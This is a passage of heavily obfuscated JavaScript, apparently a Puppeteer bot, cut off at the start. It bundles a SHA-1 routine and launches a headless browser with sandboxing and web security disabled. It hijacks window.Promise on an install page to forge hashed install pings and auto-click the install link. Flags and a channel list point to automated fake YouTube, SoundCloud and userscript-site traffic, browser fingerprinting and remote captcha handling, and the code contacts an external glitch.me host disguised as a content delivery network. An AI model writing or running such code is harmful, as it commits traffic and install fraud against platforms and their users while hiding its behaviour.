| 0xc2f * 0x1 + -0x1ac1 + 0x1291 & J['charCodeAt'](++M)), P[N >> -0x162d + -0xc1d + 0x2 * 0x1126] |= (0x1bf7 * 0x1 + 0x110a + -0x1 * 0x2c11 | L >> 0x1d7c + -0x56 * -0x1 + -0x1dc0) << y[-0x1273 + 0x5ba * 0x3 + 0x148 & N++], P[N >> -0x7f * -0x3 + 0x1 * -0x2162 + 0x1fe7] |= (-0x1 * -0x1fcb + 0x12a7 * -0x2 + 0x603 | L >> 0x1 * 0x259f + 0x602 + 0x1 * -0x2b95 & 0xffc + 0x91 + -0x827 * 0x2) << y[-0x39 * 0x51 + -0x6f + -0x127b * -0x1 & N++], P[N >> -0xa * 0xc + 0x1714 + -0x169a] |= (0x24fb + -0x9bf * 0x1 + -0x1abc | L >> 0x1 * 0x2291 + 0x880 + -0xe59 * 0x3 & 0x124f + -0x2421 + 0x7d * 0x25) << y[-0x4 * 0x2ce + 0xf69 + -0x42e & N++], P[N >> -0x1b8e + -0x52a * 0x3 + 0x2b0e] |= (0x686 + 0x1dbc + -0x2 * 0x11e1 | -0xa31 * -0x1 + 0x4 * -0x6a1 + 0x1092 & L) << y[0x2507 + 0x1 * -0x1091 + -0x5 * 0x417 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x12ea + 0x44e + -0x16f8 ? (this['block'] = P[0x1 * -0x1043 + -0x1de0 + 0x2e33], this['start'] = N - (0x14f2 + 0x2076 + -0x46e * 0xc), this['hash'](), this['hashed'] = -0x1eb * -0x4 + -0xcd * -0x1c + -0x1 * 0x1e17) : this['start'] = N;
                }
                return this['bytes'] > -0x2a426db8 + 0x4d8381a0 + 0xdcbeec17 && (this['hBytes'] += this['bytes'] / (0x17379be90 + -0x125b0ac * -0x80 + 0xa16d968 * -0x1a) << 0x144b + -0x3c9 * -0x1 + 0x17 * -0x10c, this['bytes'] = this['bytes'] % (0x68 * 0x7a7bfd + 0x10c1e2728 + -0x3de085f0)), this;
              }
            }
            [W(0x15)]() {
              if (!this['finalized']) {
                this['finalized'] = 0x1e * 0x115 + 0x983 * 0x4 + -0x1 * 0x4681;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1 * -0x14c7 + 0x839 + -0xbe * -0x11] = this['block'], J[K >> -0x7 * 0x9d + -0x1d6d + 0x21ba] |= x[0x22e5 + 0x1f17 + -0x41f9 & K], this['block'] = J[0x527 + 0xce * 0xb + -0xdf1], K >= -0x1295 + -0x24b2 + 0x1 * 0x377f && (this['hashed'] || this['hash'](), J[-0x1be * 0xc + -0x1b39 + 0x3021] = this['block'], J[-0x1f9e + -0x26ed + 0x469b] = J[-0xa * -0x223 + -0x8d2 + 0x1 * -0xc8b] = J[0x1de0 + -0x1c7b + -0x47 * 0x5] = J[-0x23c2 + -0x184 * -0x11 + 0xa01] = J[-0x2232 + 0x1f34 + 0x302] = J[0x4 * -0x4f + -0x103 * 0x6 + 0x753] = J[-0x20a2 * -0x1 + -0x108b + -0x1c9 * 0x9] = J[0x1 * 0xd0d + -0x17b * 0xb + 0x5 * 0xa7] = J[0x12b8 + 0x4 * 0x18 + -0x14 * 0xf4] = J[-0x1 * -0x18d1 + -0x1579 + -0x34f] = J[0x1 * -0x1af9 + 0x2231 + -0x1 * 0x72e] = J[-0x1 * 0xabd + 0x3 * 0xb02 + -0x49 * 0x4e] = J[-0x221a + -0x3a9 * -0x9 + 0x67 * 0x3] = J[-0xa56 + -0x1ea * 0x8 + 0x19b3] = J[0xa61 + 0x1b0 * 0x16 + -0x2f73] = J[0x377 * -0x1 + -0x18df + -0x1 * -0x1c65] = -0x22de + 0x5 * -0x427 + 0x37a1), J[0x262a + -0x4 * -0x412 + -0x3664] = this['hBytes'] << 0x37 * -0x2f + -0x14b * -0x1 + 0x8d1 | this['bytes'] >>> 0x3d6 + -0x1 * 0x21be + 0x1 * 0x1e05, J[0x35 * -0x6d + -0xb5f + 0x21ff] = this['bytes'] << -0x20d5 * 0x1 + -0x9c8 + 0x2aa0, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x14ab + -0x11cf + 0x268a; J < -0x129e + -0x77e + 0x1a6c; ++J)
                K = Q[J - (-0x16a + 0x3 * 0x90b + -0x19b4)] ^ Q[J - (0x2209 + 0x1 * 0x1b2b + 0x2 * -0x1e96)] ^ Q[J - (-0x32d * 0x3 + -0x14ca + 0x1e5f)] ^ Q[J - (0x7be + 0x114e * 0x2 + -0x2a4a)], Q[J] = K << -0x149d + -0x1190 + -0x3 * -0xcba | K >>> 0xada + 0x2 * 0x3f5 + -0x12a5;
              for (J = 0xc83 + 0x1 * 0x1bfe + -0x2881; J < 0x1bf5 + 0x139 * -0x10 + -0x851; J += -0x22f9 + 0x1dba + 0x544)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x275 + -0x18b7 + 0x1b31 | L >>> 0xf6b * 0x2 + -0xe4b + -0x1070) + (M & N | ~M & O) + P + (0xb316effa + 0xfb1 * -0x8292b + -0x3fe * -0x9e353) + Q[J] << -0x220 + -0x1da7 + 0x1fc7) << 0x1df9 + -0x1 * -0x22dc + 0x1 * -0x40d0 | P >>> 0x1c15 + 0x1f82 * -0x1 + 0x388) + (L & (M = M << 0x252a + 0x2070 + 0x115f * -0x4 | M >>> -0x2362 + -0x39 * 0x49 + 0x71 * 0x75) | ~L & N) + O + (-0x1 * -0x7d121ceb + 0x62a75fbb + 0x11 * -0x7d60f3d) + Q[J + (-0xd2 + 0x1bf7 + -0x1b24)] << 0x14b * -0x5 + 0x3 * -0x73d + -0x1 * -0x1c2e) << -0x25d3 + -0xac1 * 0x2 + -0x2 * -0x1dad | O >>> -0x76 + -0x80 + -0x15 * -0xd) + (P & (L = L << -0x205d + 0x64f * -0x2 + 0x2d19 | L >>> -0x192 * -0x16 + 0x2b * -0x59 + -0x11 * 0x127) | ~P & M) + N + (0x200cb42a + -0x4bfc3c60 + 0x867201cf) + Q[J + (-0x76d * 0x4 + -0xc4d * -0x3 + 0x107 * -0x7)] << -0x2f * -0x87 + 0x1 * 0x14bb + 0xf2c * -0x3) << 0x4 * 0x1e + -0x17 * 0x123 + 0x19b2 | N >>> -0x59 * 0x2a + -0x1dc + 0x1 * 0x1091) + (O & (P = P << 0x1 * -0x1846 + 0x1cfe + 0x1f * -0x26 | P >>> 0x1 * 0x20b + -0x4 * 0x1 + -0x205) | ~O & L) + M + (0x4b7cdcba + -0x30771213 + -0x39 * -0x11d2282) + Q[J + (-0x10e7 + -0x1b * -0x4f + 0x895 * 0x1)] << 0x1 * -0x17a4 + 0x279 * 0xe + -0xafa) << -0x2313 + -0x55a + 0x1 * 0x2872 | M >>> 0x746 + 0xd74 + -0x149f) + (N & (O = O << 0x175f + 0x413 * -0x5 + -0x2e2 | O >>> -0x1da4 + -0x98 * -0x14 + 0x28a * 0x7) | ~N & P) + L + (-0x231627b * 0x26 + -0x1d42ad * -0x73 + 0xa0b22424) + Q[J + (0x455 * -0x2 + -0x1e3 + 0x1 * 0xa91)] << 0x1f * -0xdc + -0x1b62 + 0xace * 0x5, N = N << 0xf09 + -0xf1a + 0x1 * 0x2f | N >>> 0x1d02 + 0x2 * 0xefc + 0x8 * -0x75f;
              for (; J < -0x1ba9 + 0x1892 + 0x33f; J += 0x2e * -0x56 + 0x2 * -0xd64 + 0x1 * 0x2a41)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x396 + 0x8d1 * 0x3 + -0x44 * 0x71 | L >>> 0x1a70 + 0x1 * -0xe2c + 0x1 * -0xc29) + (M ^ N ^ O) + P + (0x1cfce303 + -0xd3d155fe + 0x24 * 0x828662f) + Q[J] << -0x1 * 0x11a1 + 0x1 * 0x1e5 + 0xfbc) << 0x185 * -0x13 + 0x2309 + -0x625 | P >>> -0xbc7 + 0xd9e + -0x1bc) + (L ^ (M = M << -0x697 + 0x1b85 + -0x6f * 0x30 | M >>> -0x59f * -0x2 + 0x3 * -0x102 + 0x836 * -0x1) ^ N) + O + (0x238b746 + 0xd01d2071 + 0x1f711f * -0x32a) + Q[J + (0x1 * -0xf1c + -0x1e7e + 0x1d3 * 0x19)] << -0x5 * 0x34d + 0x2 * 0xb35 + -0x5e9 * 0x1) << -0x963 + 0x13e9 + -0xa81 | O >>> 0x1d54 + 0x5a * -0x48 + -0x7 * 0x8f) + (P ^ (L = L << 0x1571 + -0x2b3 + -0x12a0 | L >>> -0x122d + 0x20e1 + -0xeb2) ^ M) + N + (0x266fc3 * 0x1b1 + -0xbd246093 + 0xeafb4361) + Q[J + (0x1c72 * 0x1 + 0x6 * -0x5f3 + 0x742)] << -0x62b * 0x1 + 0x7 * 0x5d + 0x3a0) << -0xa * -0x23 + 0x72 + -0x1cb | N >>> -0x1 * 0x1ec5 + 0x47e + 0x1a62) + (O ^ (P = P << -0x1e7 * -0x1 + -0x3 * 0xb11 + 0x1f6a | P >>> 0x1 * -0x663 + -0x55b * 0x6 + -0x2687 * -0x1) ^ L) + M + (0x51a * 0x14a3f2 + -0x26d7cf * 0x281 + -0xbf3e6 * -0x89a) + Q[J + (-0x1b8e + -0x1 * -0x15f8 + 0x1 * 0x599)] << 0x629 * 0x2 + 0x2435 + -0x3087) << 0xe68 + 0x11b6 * 0x1 + 0xab3 * -0x3 | M >>> -0x125 * -0x9 + -0x2 * -0xa97 + -0x1f60) + (N ^ (O = O << 0x1089 + 0xe7a + 0x2cf * -0xb | O >>> 0x128e + -0x7db + -0xab1) ^ P) + L + (-0x1 * -0x9d1cfd23 + 0x2820ebf5 + -0x5663fd77) + Q[J + (-0x26d8 + 0x18d7 + 0x1 * 0xe05)] << -0x56f * 0x7 + -0x2 * 0x38d + 0x2d23, N = N << -0x76 * 0x32 + -0xa3c * 0x2 + -0x15d1 * -0x2 | N >>> 0x1372 + 0x15d * 0x6 + -0x1b9e;
              for (; J < -0x2e * 0x26 + -0x1a8 + 0x8b8; J += 0x1149 + 0x155 * -0xf + 0x8b * 0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x29 * -0x2 + -0xd6f + 0x2 * 0x691 | L >>> 0x17af + 0x5bc + -0x1d50) + (M & N | M & O | N & O) + P - (-0xdd6cb32a + -0xa161e3b5 + 0x1efb2da03) + Q[J] << -0x1 * -0x1609 + 0x26ba + 0x1441 * -0x3) << -0x3 * 0x31f + -0x62 * 0x39 + -0xf9a * -0x2 | P >>> 0x12 + 0x58 * -0xa + 0x7 * 0x7f) + (L & (M = M << 0x25fd + 0x1cae + -0x428d | M >>> 0x1 * 0x99f + 0xc99 + -0x2 * 0xb1b) | L & N | M & N) + O - (0x9658f4a9 * 0x1 + -0x295c99c1 * -0x2 + 0x1fc09 * -0x3c8f) + Q[J + (0x11 * -0x81 + 0x152a * 0x1 + -0xf8 * 0xd)] << -0xec9 + -0xb4 + 0xf7d) << 0x3 * 0x16 + 0xe28 + -0xe65 | O >>> -0x2 * 0xfd1 + -0x254c + -0x89 * -0x81) + (P & (L = L << -0x3 * -0x129 + 0x23fd + -0x275a | L >>> -0x43 * 0x82 + -0x4c * -0x1f + 0x18d4) | P & M | L & M) + N - (-0x972b * -0x1a63 + 0xd0ed3f8a + 0x1 * -0x6f9dd007) + Q[J + (-0x1127 * -0x1 + -0x265e + 0x1539)] << -0x85d + 0xd09 + -0x4ac) << -0x120d + -0x10a1 + 0xb91 * 0x3 | N >>> -0x15 * 0x61 + -0x28 * -0x30 + 0x90) + (O & (P = P << -0x1a5a + 0x812 + 0x1266 | P >>> -0x35f * -0x1 + -0x1d41 + -0x4 * -0x679) | O & L | P & L) + M - (0xa7d49f8a + -0x70c3 * 0x12a9c + 0x4c97586e) + Q[J + (-0x1131 + 0x1380 + -0x54 * 0x7)] << -0x2651 + -0x173 + 0x27c4) << 0x3e9 + -0x3 * 0x2f9 + 0x507 * 0x1 | M >>> 0x40b + -0x1b1d + 0x172d) + (N & (O = O << 0x5a * -0x23 + 0x3e0 + 0x88c | O >>> -0x1 * -0x163c + 0x1d * 0x153 + -0x3ca1) | N & P | O & P) + L - (-0x69ac0bb7 + -0x56f6 * 0x1625b + -0x1 * -0x152ef644d) + Q[J + (-0x95 * -0x26 + 0x56 * -0x71 + -0xe * -0x122)] << -0xf2 * -0x21 + 0x1805 + -0x3737 * 0x1, N = N << -0x87 + -0x2 * -0xd1f + -0x1999 * 0x1 | N >>> 0x1f * 0x3 + 0x102a + 0x1085 * -0x1;
              for (; J < 0x1 * -0x62b + -0x1b2b + 0x21a6; J += -0x2511 + 0x1b97 * -0x1 + 0x40ad)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1807 * -0x1 + -0x365 * 0x3 + 0x223b | L >>> -0x562 + -0xe * -0x1fb + -0x163d * 0x1) + (M ^ N ^ O) + P - (0x56079d6 * -0x5 + 0x22e7 * -0x3927 + 0x1 * 0x584a5f89) + Q[J] << -0x425 + 0x1 * 0x1f71 + 0xda6 * -0x2) << 0x223a + 0x817 * 0x1 + -0x2a4c * 0x1 | P >>> -0x25b6 + -0xa * -0x343 + 0x533) + (L ^ (M = M << 0x9a7 + 0x12e8 + -0x1c71 | M >>> 0x1f0a + 0x93 * -0x23 + -0x3 * 0x3a5) ^ N) + O - (0x3e49628 + 0x5e6be50e + 0x2 * -0x16599e86) + Q[J + (-0x1831 + 0x1 * -0x1d7 + 0x535 * 0x5)] << -0x3 * 0xb83 + -0x1 * -0x2167 + 0x122) << -0x2063 * 0x1 + 0xa0d + 0x165b | O >>> 0x36e * 0x4 + -0x2e9 * -0x2 + -0xc7 * 0x19) + (P ^ (L = L << 0x195a + 0xcc9 * -0x1 + -0xc73 | L >>> 0xc1e + -0x2 * 0x3df + -0x2b * 0x1a) ^ M) + N - (0xa2279f + 0x68eb2042 + 0x20ef * -0x193b9) + Q[J + (0x31 * -0x7c + -0x4f9 + 0x1cb7 * 0x1)] << -0x16fd + 0x17 * -0x16f + 0x37f6) << -0x4 * 0x709 + 0x1d * 0x50 + 0x1319 | N >>> -0x1 * -0x93b + -0x38f * -0x3 + -0x13cd) + (O ^ (P = P << 0x2708 + 0x21dc + -0x48c6 | P >>> -0x1e0 + -0x662 * -0x1 + 0x90 * -0x8) ^ L) + M - (0xb * -0x983c5b6 + 0x4e510824 + -0x528a05 * -0xf8) + Q[J + (-0x11b * -0xb + -0x1417 + 0x13 * 0x6b)] << -0x5 * 0x5d1 + -0x189e * 0x1 + 0x35b3) << 0x14 * 0x1b + 0x21df * 0x1 + -0x1 * 0x23f6 | M >>> -0x857 + -0x1dfd + 0x266f) + (N ^ (O = O << -0x7 * -0x282 + -0x1c95 + -0x1 * -0xb25 | O >>> -0x198d + -0x883 + 0x2212) ^ P) + L - (0x34d806 * 0x82 + -0x2 * 0x51f136c + 0x4b3845 * 0x7e) + Q[J + (0x183d + -0x176c + 0x29 * -0x5)] << 0xcf5 + -0x25c1 + 0x18cc, N = N << 0x1931 + -0x2 * -0xa13 + -0x2d39 | N >>> -0x1769 + 0x1b5b + 0x70 * -0x9;
              this['h0'] = this['h0'] + L << -0x1edc + 0x16c8 + 0x814, this['h1'] = this['h1'] + M << -0x1275 + -0x739 + -0x1 * -0x19ae, this['h2'] = this['h2'] + N << -0x65d * -0x3 + -0x2063 * 0x1 + 0xd4c, this['h3'] = this['h3'] + O << 0x151 + -0x2532 + 0x23e1, this['h4'] = this['h4'] + P << 0xf73 + 0xef0 + -0xa21 * 0x3;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x42b * 0x9 + -0x5f1 * 0x3 + 0x3772 & -0x23 * -0xa0 + -0x645 + -0x14 * 0xc7] + w[J >> -0x1 * -0x1741 + -0x2 * -0x10f5 + -0x3913 & -0x5 * 0x526 + 0x5 * -0x718 + 0x3d45] + w[J >> 0x84 * -0xb + 0x1841 * -0x1 + 0x1e01 & -0x2188 + 0x6 * -0x52 + 0x1 * 0x2383] + w[J >> -0x1c03 + 0x2 * 0x8cb + 0x3 * 0x37f & 0x1236 * -0x1 + -0x147a + 0x26bf] + w[J >> 0x11 * 0x1c3 + -0xd * -0x125 + -0x2cc8 & -0x16f7 + 0x1eb * 0x10 + -0xda * 0x9] + w[J >> 0x1 * 0x16f6 + 0x12a0 + -0x298e & 0xae5 + 0x1442 * -0x1 + 0x96c] + w[J >> 0xa9 + 0x978 + -0xa1d & 0x21c3 + 0x1870 + -0x7a * 0x7a] + w[-0x1 * 0x123 + -0x10ab + 0x11dd & J] + w[K >> -0x26a * 0x4 + 0x18e * 0x10 + -0xf1c & 0x1 * -0x15d + -0x9bf * -0x2 + -0x101 * 0x12] + w[K >> 0xc42 * 0x3 + -0x1ef + -0x22bf & 0x242c + -0x119e + -0x1 * 0x127f] + w[K >> -0x427 * 0x1 + 0x1 * 0xfd7 + 0x5ce * -0x2 & 0x11 * -0x1 + -0xffa * -0x2 + -0xa9c * 0x3] + w[K >> -0x322 * -0xc + 0x1 * 0x1135 + -0x36bd & 0x1f45 + -0xec * 0x26 + -0x1e9 * -0x2] + w[K >> -0x3c9 + -0x257b + 0x4 * 0xa54 & 0x2588 + -0x1f5 * 0x1 + -0x2384] + w[K >> -0x18e2 + -0x1 * 0x1b8e + 0x3478 & -0x19 * 0xdf + -0xb * 0x2 + 0x15ec] + w[K >> -0x21c3 + 0x6f3 + 0x1ad4 & 0x9 * -0x37f + 0x239c + 0x1 * -0x416] + w[-0x123 + -0x16a7 + -0xb9 * -0x21 & K] + w[L >> -0x1cd0 + 0xb92 + 0x2 * 0x8ad & -0xaf3 * 0x1 + 0x65f * 0x6 + -0x1b38] + w[L >> -0x1a25 * 0x1 + 0x2b * -0xb7 + 0x38fa & 0x518 * -0x4 + -0x466 + 0x18d5] + w[L >> -0x413 + 0x1b * 0x116 + -0x192b & 0x1c3b + 0x19 * 0x1 + -0x1c45 * 0x1] + w[L >> 0x1c6c + 0x7d6 + 0xe2 * -0x29 & -0x1 * -0x1b52 + -0x518 + -0x1 * 0x162b] + w[L >> -0x1 * -0x475 + 0x25ab + 0xa85 * -0x4 & -0xb99 * -0x1 + -0x23fe + 0x1874] + w[L >> -0xd * 0x11b + -0x1 * -0x1b06 + -0xc9f & -0xef1 + 0x25fc + 0xb7e * -0x2] + w[L >> -0x14d9 * -0x1 + -0x21b * 0xc + -0x46f * -0x1 & 0x72b * -0x4 + -0x1e03 + 0x3abe * 0x1] + w[0x13f * 0x12 + -0x3 * -0x542 + -0x2625 & L] + w[M >> -0x1 * 0x23d5 + -0x2a5 * -0x1 + 0x214c & 0x81 * -0xd + -0x4f5 + -0x15 * -0x8d] + w[M >> 0x1 * -0x1069 + -0x9 * -0x3e3 + -0x127a & -0x7a7 * -0x1 + 0x1 * -0x1502 + -0xca * -0x11] + w[M >> -0x7 * -0x7 + -0x5 * 0x1e9 + 0x97 * 0x10 & 0x59b + -0x3 * 0xb85 + 0x1 * 0x1d03] + w[M >> -0x516 + 0x2569 + -0x2043 & 0x6 * -0x40f + 0x6 * 0x5ba + 0x3 * -0x351] + w[M >> -0x40f * 0x3 + 0x2 * 0x899 + -0x4f9 & -0x1cbd + 0x8fa + 0x56 * 0x3b] + w[M >> -0x7 * 0x30a + 0xefb * 0x1 + 0x653 & -0x1571 * -0x1 + -0x1 * -0xc25 + -0xb2d * 0x3] + w[M >> 0x1df6 + -0x351 * 0x9 + 0x19 * -0x1 & -0x1570 + -0x5d5 + 0x1b54] + w[-0xfd5 + 0x76 * 0x1 + -0x9e * -0x19 & M] + w[N >> 0x15e5 + -0xfe0 + 0x11 * -0x59 & 0x108b + -0x4f1 + -0xb8b] + w[N >> 0x1567 + 0x23c7 + -0x1 * 0x3916 & -0x1fe0 + 0x1 * 0x203c + 0x7 * -0xb] + w[N >> 0xea9 + -0x2027 + 0x8c9 * 0x2 & 0x1 * -0x2325 + -0x256d + 0x1 * 0x48a1] + w[N >> -0x70f * 0x2 + -0x224c + 0x183d * 0x2 & -0x6f3 + 0x4ae + 0x254] + w[N >> -0x2419 + -0x1df * 0x10 + -0x1 * -0x4215 & -0x25ca + -0xab * 0x2f + 0x453e * 0x1] + w[N >> 0x1 * 0x249a + -0x17e5 + -0xb * 0x127 & -0x20e8 + 0x18b5 + -0x7 * -0x12e] + w[N >> -0xc7 * -0x26 + 0xc * 0x30c + -0x2 * 0x210b & -0xd * -0x2de + -0x1450 + -0x1 * 0x10e7] + w[-0x25ab * 0x1 + -0x2 * -0xcec + -0x9 * -0x152 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xcac * -0x1 + 0x2030 + 0xb * -0x1c4 & 0xd * 0x1af + -0xe61 + -0x683,
                J >> 0x22a8 + -0x20ed + 0x1ab * -0x1 & 0x4fd * -0x7 + 0x769 * -0x3 + 0x479 * 0xd,
                J >> 0x1 * 0xae7 + 0x20f * 0x5 + -0x102 * 0x15 & -0x1e2c + 0x7 * -0xf1 + 0x25c2,
                0xaf6 + 0x90b * 0x1 + 0x1302 * -0x1 & J,
                K >> 0xe6a + -0xc97 * -0x1 + -0x1ae9 * 0x1 & 0x152f + 0x4ee * -0x1 + -0xf42,
                K >> 0x34a * 0x8 + -0x1935 + -0x3 * 0x59 & -0x25 * -0x101 + -0x1825 + -0x7 * 0x1b7,
                K >> -0x831 + -0x12dc + 0x1 * 0x1b15 & 0x125 * -0x6 + 0x4de * 0x6 + 0x25f * -0x9,
                -0x184e + -0x1 * -0x35d + 0x15f0 & K,
                L >> 0xa * -0x32b + 0x1a13 * 0x1 + -0x1 * -0x5b3 & -0x17c7 + -0x1 * -0x16eb + -0x1db * -0x1,
                L >> 0x1949 * -0x1 + -0xf93 * 0x2 + -0x12d5 * -0x3 & -0x13 * 0x75 + -0x1200 + 0x1bae,
                L >> 0x31 + 0x4 * -0x1 + -0x25 & -0x7c3 * 0x5 + 0x2070 + 0x75e,
                0x1647 + 0x347 * 0x4 + -0x2264 & L,
                M >> 0x463 * 0x5 + 0x32a + -0x1901 & 0x272 * 0x7 + 0x22 * 0xca + -0x2af3 * 0x1,
                M >> -0x261 * -0x5 + -0x1148 + -0x1f * -0x2d & -0x551 + 0x194f + 0x3 * -0x655,
                M >> -0x24f0 + 0xa * 0x392 + -0xa2 * -0x2 & 0xae2 + 0x2 * 0x10b + 0x5 * -0x265,
                -0x18ca + 0x23e5 + 0x2 * -0x50e & M,
                N >> -0x1295 * 0x1 + -0xc4 * 0xd + -0x15d * -0x15 & -0x2288 + -0x900 + 0x2c87,
                N >> 0x1 * -0xf38 + -0x642 + 0x158a & 0x1 * -0x2d2 + 0x11 * 0x3b + -0x1a,
                N >> -0xa1d * 0x3 + 0x1fa2 * 0x1 + -0x143 & -0x823 * -0x1 + 0x3 * -0x61f + 0x1 * 0xb39,
                -0x1 * 0x1def + 0x1bf9 + -0x2f5 * -0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xbeb + -0x43 * -0x85 + -0x16d0), (K = new DataView(J))['setUint32'](-0x198a + -0x252f + -0x1 * -0x3eb9, this['h0']), K['setUint32'](-0x1 * 0x13a1 + 0x1473 * 0x1 + 0x2 * -0x67, this['h1']), K['setUint32'](-0x1 * -0xde + 0xa9d + -0x3d1 * 0x3, this['h2']), K['setUint32'](-0x1 * -0xef + 0x263e + 0x1dd * -0x15, this['h3']), K['setUint32'](0x6c9 * 0x3 + 0xe12 + -0x225d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x718 + -0x1 * -0x9dd + -0x2c5 * 0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1c0b + 0x2 * -0x42d + 0x4d * 0x79;
            J[0x52e + -0x2006 + -0x35b * -0x8]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x5 * -0x8f + -0x21ca + 0x2495] = L => {
              const X = b;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te'](X(0x1d, '@!qj') + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1e7d + 0x6 * -0x7 + -0x1e52), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x147e + -0x9 * 0x2 + 0x1 * -0x146b;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1614 + -0x6b * -0x17 + 0x1253), Promise['resolve'](0xadd + -0x2 * 0xcb1 + -0xd * -0x11e);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x4cb + -0x295 * 0xf + 0x741 * 0x6; j < 0x270c + 0x198c + 0xceb * -0x5; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * -0x885 + 0x1742 * 0x1 + 0x1083 + (0x1318 + 0x5 * -0x3fc + -0x16 * -0x92) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x2149 + 0x1b1 + 0x1d * 0x117) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * 0x1989 + 0x1d3b + -0x36c4; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
